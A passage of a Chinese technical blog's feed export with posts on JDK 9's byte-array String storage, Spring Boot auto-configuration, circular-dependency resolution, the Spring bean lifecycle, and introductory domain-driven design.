    <title>JDK9String变化</title>
    <link href="http://example.com/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/"/>
    <id>http://example.com/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/</id>
    <published>2022-04-05T02:10:55.000Z</published>
    <updated>2022-04-05T03:03:29.365Z</updated>
    
    <content type="html"><![CDATA[<p>最近无意间点开String数组发现了一件奇怪的东西，就是String由[]char 变为了byte[] value</p><img src="/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/image-20220405101330418.png" class><p>这就引起了我的好奇心了，在我的印象里一个char是2个字节，而byte是一个字节，面对汉字这种东西，用一个字节肯定是远远不够的，那应该如何去存储？我去带着问题好好搜索了一下</p><p>先让我们去看一下这段翻译：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs pgsql">This field <span class="hljs-keyword">is</span> <span class="hljs-keyword">trusted</span> <span class="hljs-keyword">by</span> the VM, <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> a subject <span class="hljs-keyword">to</span><br><span class="hljs-keyword">constant</span> folding <span class="hljs-keyword">if</span> String instance <span class="hljs-keyword">is</span> <span class="hljs-keyword">constant</span>. Overwriting this<br>field <span class="hljs-keyword">after</span> construction will cause problems.<br><br>此字段受 VM 信任，如果 String 实例为常量，则该字段受常量折叠的影响。 构建后覆盖该字段会导致问题。<br></code></pre></td></tr></table></figure><img src="/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/image-20220405102353192.png" class><p>这是String源码里的一段内容，如果分为LATIN1和UTF16，也就是拉丁和utf-16来分别进行编码的，而拉丁对于每个字符占用一个字节，utf-16对于每个字符占用两个字节，所以可以根据编码内容的不同，去使用不同的编码格式。</p><p>比如中文就可以utf-16,英文就是LATIN1,这样子既能完成正常表示，又节省了内存</p><img src="/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/image-20220405102847361.png" class><p>对于JDK9之前对于全部是字符的存储就会浪费一半的空间，但是JDK9之后几乎是没有浪费了</p><img src="/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/image-20220405105019849.png" class><p>对于中文加英文的组合那就与原来的char数组一样了，会造成一定的空间浪费，这也是无法避免的</p><img src="/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/image-20220405105152299.png" class><p>可以看到在求字符串长度的时候，会进行一个右移的操作</p><img src="/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/image-20220405105248703.png" class><p>也就是说对于拉丁字符串来说，它就是返回它的原长度，而对于utf-16来说，他会去右移一位，也就是除以2.</p><p>这样有什么好处？</p><p>第一节省内存空间，对于纯拉丁的字符可以节省一倍的空间</p><p>第二减少GC次数</p><p>以上就是我对这个变化的理解了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近无意间点开String数组发现了一件奇怪的东西，就是String由[]char 变为了byte[] value&lt;/p&gt;
&lt;img src=&quot;/2022/04/05/Java%E5%9F%BA%E7%A1%80/JDK9String%E5%8F%98%E5%8C%96/i</summary>
      
    
    
    
    <category term="Java基础" scheme="http://example.com/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="Java基础" scheme="http://example.com/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot自动装配机制</title>
    <link href="http://example.com/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/"/>
    <id>http://example.com/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/</id>
    <published>2022-04-03T14:13:06.000Z</published>
    <updated>2022-04-03T14:32:30.274Z</updated>
    
    <content type="html"><![CDATA[<p>自动装配机制简单来说就是自动把第三方组件的Bean装载到Ioc容器当中，不再需要开发人员再去写bean，相关的一个配置，SpringBoot应用里只需要再启动类加上@SpringBootApplication注解就可以实现自动装配</p><img src="/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/image-20220403221553586.png" class><p>可以看到@SpringBootApplication里又有很多别的注解</p><img src="/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/image-20220403221709972.png" class><p>最主要的就是@EnableAutoConfiguration注解</p><img src="/2022/04/03/Spring/SpringBoot%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%E6%9C%BA%E5%88%B6/image-20220403221806622.png" class><p>自动装配原理主要依靠三个核心关键技术</p><ol><li>引入stater</li></ol><p>启动组件的时候，组件必须有一个@Configuration配置类，在这个配置类我们需要通过@Bean这个注解声明需要去装配到Ioc容器里的Bean对象</p><ol start="2"><li>这个配置类是放在第三方jar包里面</li></ol><p>通过spring boot约定大于配置的理念把这个配置类的全路径放在classpath:&#x2F;META-INF&#x2F;spring.factories,这样spring boot就可以知道嗲三方jar包里的这个配置类的位置，这主要是用到了springFactoriesLoader来完成</p><ol start="3"><li>Spring Boot拿到所有jar包以后</li></ol><p>通过spring提供的importSelector这样的接口来对这些配置类的动态加载，从而完成自动装配</p><p>关于重写spring boot的stater方法</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-meta">@EnableConfigurationProperties(&#123;</span><br><span class="hljs-meta">        EnforcementProperties.class, SiteProperties.class, ConvictionProperties.class,</span><br><span class="hljs-meta">        RadiusProperties.class, RabbitPoolProperties.class, SyslogProperties.class,</span><br><span class="hljs-meta">        RestDynamicAuthorizationProperties.class, AuthorizationProperties.class,</span><br><span class="hljs-meta">&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">var</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(Application.class, args);<br>        context.getBean(Bootstrap.class).run();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是我的老大写的一段启动代码，可以看到@EnableConfigurationProperties注解可以去加载相应的类，然后context就相当于加载好了配置文件，然后可以通过getBean获取相应的bean然后执行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自动装配机制简单来说就是自动把第三方组件的Bean装载到Ioc容器当中，不再需要开发人员再去写bean，相关的一个配置，SpringBoot应用里只需要再启动类加上@SpringBootApplication注解就可以实现自动装配&lt;/p&gt;
&lt;img src=&quot;/2022/0</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Spring如何解决循环依赖</title>
    <link href="http://example.com/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/"/>
    <id>http://example.com/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/</id>
    <published>2022-04-03T13:50:47.000Z</published>
    <updated>2022-04-03T14:11:47.829Z</updated>
    
    <content type="html"><![CDATA[<p>如果在 代码中把两个或者两个以上的Bean相互之间持有，对方的引用就会产生循环依赖（类似死锁），而循环依赖又会导致死循环，这是发生spring循环依赖的原因<br>spring循环依赖有三种</p><h2 id="依赖方式"><a href="#依赖方式" class="headerlink" title="依赖方式"></a>依赖方式</h2><h3 id="相互依赖"><a href="#相互依赖" class="headerlink" title="相互依赖"></a>相互依赖</h3><p>也就是A依赖B，B又依赖A，它们之间形成一个循环</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403215426283.png" class><p>如图所示</p><h3 id="三者依赖"><a href="#三者依赖" class="headerlink" title="三者依赖"></a>三者依赖</h3><p>第二种是三者之间的依赖，也就是A依赖B，B依赖C，C依赖A</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403215537436.png" class><h3 id="自我依赖"><a href="#自我依赖" class="headerlink" title="自我依赖"></a>自我依赖</h3><p>也就是A依赖A</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403215654849.png" class><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>Spring设置了三级缓存去解决循环依赖问题，当我们去通过getBean去获取对象实例的时候，spring会先去一级缓存去查找，如果一级缓存没有就会去二级缓存查找，如果都没有找到，那就意味着这个对象没有被实例化，那soring就会去实例化这个bean，而初始化的这个bean我们先把它称之为早期的bean，会把目标bean放在二级缓存，同时加入一个标记，表示它是否存在循环依赖，如果不存在，就把它放在二级缓存，否则就标记这个bean存在循环依赖，然后等待下一次轮询的时候去复制，也就是解析Autowired注解，等Autowired复制完以后，会将目标bean放在一级缓存</p><img src="/2022/04/03/Spring/Spring%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96/image-20220403220347120.png" class><p>一级缓存用于存放所有的成熟的bean，二级缓存存放所有的早期把bean，先去取一级缓存，后去取二级缓存</p><p>三级缓存用来存储代理bean，当调用getBean的时候，发现目标bean需要通过代理工厂来创建，这个时候会把对象保存到三级缓存，最后会把复制好的bean放在一级缓存</p><h2 id="无法解决循环依赖的情况"><a href="#无法解决循环依赖的情况" class="headerlink" title="无法解决循环依赖的情况"></a>无法解决循环依赖的情况</h2><ol><li>多实例的bean通过setter方法不能解决循环依赖</li><li>构造器注入bean的情况</li><li>单例代理的bean通过setter注入的情况下</li><li>设置@DependsOn注解的bean</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;如果在 代码中把两个或者两个以上的Bean相互之间持有，对方的引用就会产生循环依赖（类似死锁），而循环依赖又会导致死循环，这是发生spring循环依赖的原因&lt;br&gt;spring循环依赖有三种&lt;/p&gt;
&lt;h2 id=&quot;依赖方式&quot;&gt;&lt;a href=&quot;#依赖方式&quot; class=&quot;</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>SpringBean生命周期</title>
    <link href="http://example.com/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"/>
    <id>http://example.com/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/</id>
    <published>2022-04-03T13:48:06.000Z</published>
    <updated>2022-04-03T13:49:52.185Z</updated>
    
    <content type="html"><![CDATA[<h2 id="spring-bean生命周期"><a href="#spring-bean生命周期" class="headerlink" title="spring bean生命周期"></a>spring bean生命周期</h2><p>大致分为5个阶段</p><h3 id="创建前准备"><a href="#创建前准备" class="headerlink" title="创建前准备"></a>创建前准备</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213005817.png" class><p>这个阶段是bean在开始加载之前要从上下文和一些配置当中去解析和查找和bean有关的扩展实现比如像“init_method”是容器在初始化bean的时候会调用的方法，destory是bean在销毁的时候会去调用的方法。以及beanFactoryPostProcessor这一类的bean,加载过程中的一些前置和后置的一些扩展实现，这些类和配置是spring提供给开发者用来去实现bean,加载过程中的一些扩展，在很多spring集成的中间件比较常见</p><h3 id="创建实例化"><a href="#创建实例化" class="headerlink" title="创建实例化"></a>创建实例化</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213531512.png" class><p>这个阶段是通过反射去创建bean的实例对象，并且会扫描和解析bean声明的一些属性，</p><h3 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213637070.png" class><p>如果被实例化的bean存在依赖其他bean的一些情况，那就需要对这些依赖的bean进行对象的注入，比如常见的@Autowired,以及setter注入，这样的一些配置形式，同时这些时间会出发一些扩展的调用，比如常见的扩展类BeanPostPreocessors,用来实现Bean的初始化前后的扩展回调</p><h3 id="容器缓存"><a href="#容器缓存" class="headerlink" title="容器缓存"></a>容器缓存</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403213955349.png" class><p>把bean保存到容器当中，以及spring的容器当中，此时的bean就可以被开发者去使用了，init method方法就会在这个阶段被调用，以及BeanPostPreocessors的后置方法，</p><h3 id="销毁实例"><a href="#销毁实例" class="headerlink" title="销毁实例"></a>销毁实例</h3><img src="/2022/04/03/Spring/SpringBean%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/image-20220403214152446.png" class><p>最后就是销毁阶段，当spring的应用上下文被关闭的时候，这个上下文当中的所有的bean就会被销毁，如果存在bean实现了DisposableBean接口，或者配置了destory_method属性的一些方法，会在这个阶段被调用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;spring-bean生命周期&quot;&gt;&lt;a href=&quot;#spring-bean生命周期&quot; class=&quot;headerlink&quot; title=&quot;spring bean生命周期&quot;&gt;&lt;/a&gt;spring bean生命周期&lt;/h2&gt;&lt;p&gt;大致分为5个阶段&lt;/p&gt;
&lt;h3 i</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>DDD入门五板斧（三）统一语言和模型价值</title>
    <link href="http://example.com/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/"/>
    <id>http://example.com/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/</id>
    <published>2022-04-03T11:50:39.000Z</published>
    <updated>2022-04-03T13:21:35.279Z</updated>
    
    <content type="html"><![CDATA[<p>在前两篇文章我们主要讲了领域驱动设计上的DP Entity Repository以及相应的代码实现。现在我们聊聊领域驱动设计在宏观上的几个概念。</p><h3 id="DP"><a href="#DP" class="headerlink" title="DP"></a>DP</h3><p>DP也可以被称为VO(ValueObject),这里的value object是DDD语境下的概念</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403204011544.png" class><h4 id="统一语言-Ubiquitous-Language"><a href="#统一语言-Ubiquitous-Language" class="headerlink" title="统一语言(Ubiquitous Language)"></a>统一语言(Ubiquitous Language)</h4><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403204320736.png" class><p>在做一个东西的时候，我们需要有领域专家和相关技术人员一起去进行螺旋式的建模，通过形成UL消化业务知识，然后向模型中提炼知识，如此往复.</p><p><strong>一个好的模型价值千金</strong></p><p>星盘由古希腊人发明，星盘上可旋转的铜环代表各个恒星在天体上的位置</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403204840264.png" class><p>刻有当地地平坐标系的盘面是可替换的，它代表不同维度的星空景象，我们可以计算出任何时刻的天体位置，反之，如果知道恒星在天体上的位置也能反向计算出时间。这里星盘用机械的方式建立了<strong>恒星和时间的对象模型</strong>，而我们也可以使用软件来计算出这样的模型，但是我们需要首先向天文学家学习专业的天文领域知识，然后进行建模，我们需要去适应不断变化的星空，不能因为更改了坐标系而失效，不能因为新加入一颗恒星就失效。</p><p>领域驱动设计就是一套方法论，帮助我们建立良好的对象模型</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403205526736.png" class><p>为了建设有价值的模型，我们需要在形成UL的基础上消化知识，并向模型中提炼知识</p><h3 id="DP-amp-Entity"><a href="#DP-amp-Entity" class="headerlink" title="DP &amp; Entity"></a>DP &amp; Entity</h3><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403205800590.png" class><p>充血模型就是除了赋予对象除了属性和属性的读写方法之外，包含业务逻辑的行为，比如身份证对象去能自己验证身份证号是否符合规范，这样就能让模型本身高内聚，而不是每次设计一个业务操作就去交给其他对象处理，形成紧耦合。所以哪些对象应该被包含、哪些又应该去被拆分出去，这就要依靠我们的经验了。<strong>自治的、丰富的、有活力的</strong></p><p>DP无状态而Entity有状态，什么是状态？</p><ol><li>该对象是否存在生命周期</li><li>程序是否需要追踪改对象的变化事件</li></ol><p>这里进行一个简单的解释：我们知道在体育馆有很多的座位</p><img src="/2022/04/03/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%89%EF%BC%89%E7%BB%9F%E4%B8%80%E8%AF%AD%E8%A8%80%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%BB%B7%E5%80%BC/image-20220403210511727.png" class><p>假如观众通过预定程序买了票，每张票都有一个座位号相对应，在这里座位就是有状态的，也就是Entity,程序需要去关注对象的事件变化，比如通过唯一ID去追踪该对象，关注它的预定状态，价格、位置等属性</p><p>假如用户通过预定程序买了票，只要进去就可以随便坐，这里座位就是无状态的，程序不需要对每个座位进行追踪，只需要关注总数量就可以了，这就是DP和Entity的异同之处</p><p>总的来说就是：<strong>为了建设有价值的模型，在确认UL之后消化领域知识，向无状态的DP和有状态的Entity中提炼知识</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在前两篇文章我们主要讲了领域驱动设计上的DP Entity Repository以及相应的代码实现。现在我们聊聊领域驱动设计在宏观上的几个概念。&lt;/p&gt;
&lt;h3 id=&quot;DP&quot;&gt;&lt;a href=&quot;#DP&quot; class=&quot;headerlink&quot; title=&quot;DP&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="DDD" scheme="http://example.com/categories/DDD/"/>
    
    
    <category term="DDD" scheme="http://example.com/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>DDD入门五板斧（二）EntityAndDomainService</title>
    <link href="http://example.com/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/"/>
    <id>http://example.com/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/</id>
    <published>2022-04-02T10:19:01.000Z</published>
    <updated>2022-04-03T11:51:41.971Z</updated>
    
    <content type="html"><![CDATA[<p>根据上一篇文章，我们主要是引入了DP这个概念，简单来说，DP就是构建领域的基础类型，并通过对一个实际例子的改造，展示了DP在明确接口语义，内聚隐形逻辑，简化单元测试方面的作用。本期我们将通过拓展这个业务案例来引入新的概念Entity&amp;DomainService。同时讲一讲工程设计上的一些要点</p><p>假如我们现在做一个简单的数据统计系统，地推员输入客户姓名和手机号。根据客户手机号的归属地和所属运营商，将客户群体分组，分配给相应销售组，由销售组跟进后续业务。</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403182443211.png" class><p>如图是我们上一节完成的相关代码</p><p>现在我们新加入一些业务需求：</p><ol><li>需要对手机号进行实名验证，假设由中国移动提供此服务。</li><li>根据外部服务返回的实名信息，按照一定逻辑计算出用户标签，并且记录在用户的账号。</li><li>根据用户标签为该用户开通相应等级的新客福利</li></ol><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403182836740.png" class><p>如图为业务流程图</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403183042743.png" class><p>如图为相关业务代码</p><p>下面我们从三个方面对以上代码进行分析与重构</p><h3 id="对外部依赖的耦合十分严重"><a href="#对外部依赖的耦合十分严重" class="headerlink" title="对外部依赖的耦合十分严重"></a>对外部依赖的耦合十分严重</h3><p>什么是外部服务？</p><p>一切不属于当前域的设施与服务都属于外部服务。比如数据库、数据库schema、ORM框架、中间件等属于计算机内部而不属于当前业务的服务。</p><p>比如一个系统可能要从MySQL替换为PostgreSQL, 比如一张表添加了几个字段，比如外部系统的变动会影响RPC接口变动。这些东西不属于业务本身，我们对于这些东西没有控制权，而我们要做的就是即使这些依赖发生变化，我们的业务本身也不能改变，或者说尽量少改动，这就体现了一个代码的可维护性，现在我们来分析上述代码的可维护性。</p><h4 id="对数据库的schema依赖"><a href="#对数据库的schema依赖" class="headerlink" title="对数据库的schema依赖"></a>对数据库的schema依赖</h4><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403183935164.png" class><p>这段代码就是典型的面向数据库编程，主要操作就是从数据表读入信息，然后增加一些信息并写入。这里的业务代码强依赖了数据库的schema，也就是DO类，在这里如果数据表字段发生变化，那对应的DO类就会残生变动，业务代码就不得不发生改变。如果此时业务更加复杂，那DO类就会被改的面目全非。</p><h4 id="对数据库ORM依赖"><a href="#对数据库ORM依赖" class="headerlink" title="对数据库ORM依赖"></a>对数据库ORM依赖</h4><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403184557539.png" class><p>这里使用到了我们常见的mybatis,假如我们现在需要升级ORM框架，或者替换掉ORM框架，那此时业务代码就必须要大量进行改动</p><h4 id="RPC服务依赖"><a href="#RPC服务依赖" class="headerlink" title="RPC服务依赖"></a>RPC服务依赖</h4><p>这里使用了中国电信提供的实名信息查询服务，并且强依赖于业务逻辑，假设中国电信提供该接口的入参和返参都产生变化，那逻辑代码就会去产生变化</p><p>由此可见，这个代码耦合度非常之高，形成耦合的原因是什么？</p><p>主要原因就是我们是面向实现编程。那我们就需要把它改变为面向抽象接口编程，领域驱动就会成为一种指导思想，辅助我们设计</p><p>抽象接口本身就像是一种中间协议，依赖方和被依赖方都要对这个协议负责，接口将软件分层隔离，这种隔离下，任何一方变动都会被控制在可控制的范围之内</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403190530204.png" class><p>这里我们改动如下：</p><h4 id="数据库的schema依赖改造"><a href="#数据库的schema依赖改造" class="headerlink" title="数据库的schema依赖改造"></a>数据库的schema依赖改造</h4><ol><li>使用realnameService接口替代了TeleComRealNameService的具体实现，注册逻辑中的具体实现对象（联通或者电信）是通过配置来注入的这就产生了控制反转类似于Spring</li><li>使用RealnameInfo这个DP，代替TelecomInfoDTO的具体实现这样后续业务只需要关注RealnameInfo的返回结构而不需要去改具体的业务上的逻辑。这样无论是参数变化还是其他变化，我们都只用去改变配置文件或者具体实现类</li></ol><p>这里浅提一个概念：防腐层，也就是防止外部系统腐烂影响到我们的系统。如RealnameInfo</p><h4 id="对数据库ORM依赖依赖改造"><a href="#对数据库ORM依赖依赖改造" class="headerlink" title="对数据库ORM依赖依赖改造"></a>对数据库ORM依赖依赖改造</h4><ol><li>DO作为数据表的直接映射属于具体实现，不应该去暴露给业务逻辑</li><li>DAO作为数据访问层的具体实现不应该暴露给业务层，我们这里引入新的概念Entity&amp;DomainService，老代码依赖于业务逻辑，也就是直接依赖DO和DAO，事实上业务逻辑应该去面向领域实体，而不是去关心对象被后是否使用了数据库，更不用关心数据表中的相关字段。也就是上层业务逻辑不需要去关心下层实现</li></ol><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403191843999.png" class><p>这里我们定义User类为领域实体，这里的属性用于描述在这个系统内客户应该去含有的信息，可以尽量多使用DP来将自检和隐性属性内聚起来，定义User类的时候，我们不要关心下层数据库的具体实现，甚至最后User一部分信息位于内存，一部分位于数据库，这都无所谓。</p><p>这里的Entity是一种有状态的领域实体，就像是一种动态的东西。而DP是一种无状态，组成实体的基础类型。</p><p>比如phoneNumber是无状态的而User是有状态的。</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403192351148.png" class><p>而此时，我们的repository就是一种一种具体的对于数据库的操作，而这里的对于数据库的操作就比较随意，这里可以对于各种数据库去操作</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403192624321.png" class><p>此时改造后的业务代码，此时结构更加清晰，核心业务逻辑不再依赖其他任何实现，无论外部依赖如何变化，业务逻辑层都不会变化。</p><h4 id="内部逻辑耦合"><a href="#内部逻辑耦合" class="headerlink" title="内部逻辑耦合"></a>内部逻辑耦合</h4><p>我们可以看到最初的代码register方法耦合了各种业务逻辑，比如参数一致性验证、计算用户标签、查询绑定的销售组信息。参数一致性校验，计算用户标签等。而这里的业务逻辑不应该是我们这里所应该去关心的，也就是说如果用户标签发生变化，或其他逻辑发生变化，那业务层就必须发生变化。</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403193210941.png" class><p>这里我们进行了一定程度的解耦，可以看到，此时发奖逻辑和风控检查这种逻辑关系依然位于注册业务，而注册业务本身应该是保存新用户才对。而发奖的原因就是为了给用户一些福利，假如我们以后不愿意去发放福利了呢？它的本质是为了判断用户是否是新用户而衍生的一种操作，那在注册的业务域当中，我们把它的行为抽象为<strong>获取用户信息，检查并且更新用户，存储用户</strong>这三个步骤，而检查并更新用户里又存在发奖行为</p><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403193832637.png" class><p>这里经过改变以后，checkUserService可能会改变User或者Reward对象的状态，涉及到了多个Entity状态改变的服务。被称为<strong>Domain Service</strong>,它主要用于封装多Entity或跨业务域的逻辑</p><img 